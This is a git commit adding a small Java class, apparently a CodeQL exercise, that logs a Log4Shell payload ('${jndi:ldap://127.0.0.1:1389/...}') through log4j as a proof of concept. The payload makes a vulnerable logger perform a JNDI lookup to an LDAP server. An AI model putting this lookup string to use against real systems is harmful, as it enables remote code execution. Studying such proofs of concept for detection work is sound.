176c1af1809fe442a3c22ca77accde0333dd712c
ninthDevilHAUNSTER <luotianhan@126.com>
2021-12-13 00:52:11 +0800

    add task

---
+++ src/main/java/CodeQLTaskOne.java
@@ -0,0 +1,13 @@
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+
+import java.io.IOException;
+
+public class CodeQLTaskOne {
+    public static void main(String[] args) {
+        String poc = "${jndi:ldap://127.0.0.1:1389/udrlwt}";
+        Logger logger = LogManager.getLogger(CodeQLTaskOne.class);
+        logger.error(poc);
+    }
+}
+
